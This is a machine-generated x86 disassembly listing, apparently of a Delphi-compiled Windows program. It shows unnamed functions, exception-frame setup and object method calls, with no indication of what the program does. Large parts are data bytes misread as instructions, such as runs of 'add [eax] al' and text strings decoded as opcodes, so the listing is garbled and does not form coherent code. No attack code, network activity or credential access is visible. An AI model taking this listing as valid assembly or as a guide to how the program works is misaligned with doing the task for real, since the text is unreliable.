inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c608
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47957c
mov eax [ ebp - 0x10 ]
call sub_404210
test eax eax
jle r-xdata
xor eax eax
push ebp
push sub_47c5e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x4d
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47957c
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407f4c
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_407f14
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov dl [ edx + 0xaf ]
call sub_404138
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_40435c
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ba44
mov [ ebp - 0xc ] eax
jmp r-xdata
sub al 0x1b
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407f4c
mov eax [ ebp - 0x18 ]
call sub_404210
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c5ed
lea eax [ ebp - 0xc ]
call sub_40d130
retn
mov ecx esi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x30 ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47bf78
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_47c628
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479594
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47c668
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_47c7e6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax ebx
call sub_41aae4
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ edi + 0x6c ]
call sub_408080
push [ ebp - 0xc ]
push r-xdata
push [ edi + 0x68 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4042d0
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov edx eax
mov eax esi
pop ecx
call sub_41ad28
mov eax [ edi + 0x70 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47c7bc
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
call sub_41aac4
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jl r-xdata
cmp eax [ esp ]
pop edx
pop eax
jb r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2d
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
mov ecx r-xdata
pop eax
call sub_40425c
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov edx eax
mov eax esi
pop ecx
call sub_41ad28
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + 0x34 ]
call sub_404138
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4042d0
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40441c
mov edx eax
mov eax esi
pop ecx
call sub_41ad28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7c3
lea eax [ ebp - 0x8 ]
call sub_40d130
retn
jmp r-xdata
sub_47c81f
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x6e ] ah
add [ fs : ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479688
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47c868
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47c88d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c894
retn
sub_47c898
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4794dc
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_4794a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c628
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_479654
sub_47c925
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ edx + ecx * 8 + 0x47 ] dh
add al bh
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ eax - 0x3a ] ch
inc edi
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ ecx - 0x39748fba ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bl
0x47
pop eax
inc ebp
lea eax [ eax ]
nop
leave
inc edi
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
push ebx
push esi
test dl dl
je r-xdata
outsb
outsw
pop eax
pop eax
inc ebp
lea eax [ eax ]
inc esp
xor [ eax ] eax
xor al 0xca
inc edi
add [ ebp + edx * 4 + 0x54180047 ] dh
dec ecx
dec ebp
jae r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479688
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
add esp 0xfffffff0
call sub_4034a0
cwde
xor eax [ eax ]
pop eax
inc ebp
xor al 0xc9
inc edi
add [ eax ] ah
retn 0x47
sub_47c9e8
or [ eax ] al
add [ eax ] al
cmp al 0x93
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor al 0xca
inc edi
add [ ebp + edx * 4 + 0x54180047 ] dh
dec ecx
dec ebp
jae r-xdata
add [ ecx - 0x39748fba ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
push ebx
push esi
test dl dl
je r-xdata
outsb
outsw
pop eax
pop eax
inc ebp
lea eax [ eax ]
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479688
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
add esp 0xfffffff0
call sub_4034a0
sub_47ca34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_479594
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47cab4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cad9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cae0
retn
sub_47cb0f
inc [ ebx ]
add [ eax ] al
add [ eax + 0x58 ] bl
inc ebp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_47cb3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cb44
retn
sub_47cb50
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cb75
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cb7c
retn
sub_47cb88
aam 0xcb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl

sub_47cbaa
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
int3
sub_47cd44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
int 0x47
add al bl
int 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
int 0x47
add [ eax + eax ] cl
add ah ah

sub_47cd6a
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
rcl ah 0x47
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
or ah dl
inc edi
add [ eax - 0x77ffbe71 ] ch
nop
inc ecx
add [ eax - 0x4fffbe70 ] bh
nop
inc ecx
add [ eax ] bh
rol [ edi ] cl
push cs
into
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x32 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 8 + 0x47 ] ch
add [ eax + eax ] al
add ah ah

add [ eax ] cl
add [ eax ] al
or eax 0x41644954
je r-xdata
xor [ eax ] al
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
dec ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
pushfd
jo r-xdata
int 0x47
add [ edi ] al
or eax 0x41644954
je r-xdata
nop
popad
inc ebp
js r-xdata
or [ ecx ] dh
inc eax
add al bh
aad 0x47
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
inc edi
add [ edi ] al
pop es
push esp
dec ecx
push esp
js r-xdata
push esp
aad 0x47
add [ eax - 0x77ffbe71 ] ch
nop
inc ecx
add [ eax - 0x4fffbe70 ] bh
nop
inc ecx
add [ eax ] bh
rol [ edi ] cl
pop es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jae r-xdata
jo r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
iretd
dec esp
into
inc edi
add [ esp + ecx * 8 + 0x30047 ] bl
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
int 0x47
add [ esp + ecx * 8 + 0x30047 ] bl
or [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
add [ ebx + 0x56 ] dl
call sub_403508
popad
push eax
popad
jb r-xdata
inc ecx
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x47 ] al
add [ eax + eax ] cl
add [ eax ] al
cwde
into
inc edi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
sbb al [ ebp + 0x49 ]
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
jae r-xdata
popad
add [ gs : bx + si ] al
nop
in al 0xce
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
into
inc edi
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
lodsb [ esi ]
inc esi
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
adc eax [ ebp + 0x49 ]
dec ebp
push esp
dec ecx
push esp
js r-xdata
add [ edi ] al
popad
add [ gs : bx + si ] al
lea eax [ eax ]
dec esp
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov ebx edx
mov eax esi
call sub_403144
test bl bl
jle r-xdata
jb r-xdata
insb
je sub_47cffc
jb r-xdata
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403154
mov edx ebx
and dl 0xfc
add [ fs : eax ] al
add bh bh
add [ fs : eax ] al
add [ eax ] al
outsb
popad
je r-xdata
add [ eax ] al
add bh bh
dec ebp
sub_47cffc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47d0a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0x8 ]
call sub_404210
test eax eax
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_403fa4
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x22
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_4044b0
push 0x1
push ebx
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d0a7
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
sub_47d0cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_403f50
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_47d104
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_47d192
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407f14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d199
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0x60 ]
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_47d1a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47d229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40309c
mov edi eax
mov eax esi
call sub_40309c
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47d330
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47d39c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47d36c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47d3d0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_418bac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d230
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_47d238
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_47d2d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40309c
cmp eax [ r-xdata ]
jne r-xdata
add esp 0xfffffff0
call sub_4034a0
mov ecx esi
xor edx edx
mov eax edi
call sub_418f04
mov [ edi + 0x2c ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_47814c
mov [ edi + 0x28 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_47814c
mov [ edi + 0x24 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d2da
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
sub_47d2da
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47d2f8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_403154
mov eax [ esi + 0x24 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f3c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_47d408
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47d4b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40309c
mov edi eax
mov eax esi
call sub_40309c
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47d330
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47d39c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47d36c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47d3d0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_47d4f4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_47d528
lea eax [ ebx + 0x48 ]
mov edx [ esi + 0x48 ]
call sub_403fa4
mov edx esi
mov eax ebx
call sub_47d1a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d4b9
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
sub_47d4c0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47d2f8
test bl bl
jle r-xdata
mov eax [ esi + 0x48 ]
call sub_408598
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_47d554
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038d0#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40309c
mov edi eax
mov eax esi
call sub_40309c
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_47d330
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47d39c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_47d36c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47d3d0
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_47d1a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d5ef
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_47d5f8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403154
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47d2f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_47d628
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038d0#8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d66b
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_4049cc
sub_47d670
push ebp
mov ebp esp
add esp 0xfffffff8
sub [ rw-data ] 0x1
jae r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_417b64
sub_47d6a0
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4038d0#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d6cc
retn
sub_47d717
dec [ ecx ]
add [ eax ] al
add [ ebp + edx * 2 + 0x6e ] bl
insd
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl al
inc edi
add [ eax + eax ] bh
add [ eax ] dl
pushad
inc edi
add [ ebx + esi + 0xc180040 ] al
inc edx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
enter 0x47ec 0x0
int3
add [ fs : eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push j_sub_4038d0#6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d76b
retn
mov eax rw-data
mov ecx 0x4
mov edx [ r-xdata ]
call sub_4049cc
sub_47d779
xlat
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl al
inc edi
add [ eax + eax ] bh
add [ eax ] dl
pushad
inc edi
add [ ebx + esi + 0xc180040 ] al
inc edx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
enter 0x47ec 0x0
int3
sub_47e53c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4038d0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x1c ]
mov esi edi
cmp [ esi + 0x78 ] 0x0
jne r-xdata
mov eax [ edi + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x142 ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0x18 ]
push eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x20 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0x10 ]
mov eax [ edi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx 0x1
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov edx ebx
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
cmp [ esi + 0x78 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e640
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_403f74
retn
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
sub_47e69d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
xor edx edx
push ebp
push j_sub_4038d0#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x1c ]
cmp [ edx + 0x78 ] 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov eax [ ebp - 0xc ]
push eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x14 ]
xor ecx ecx
pop eax
call sub_408df4
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40425c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov esi eax
mov edx ebx
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e75f
sub_47e7a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
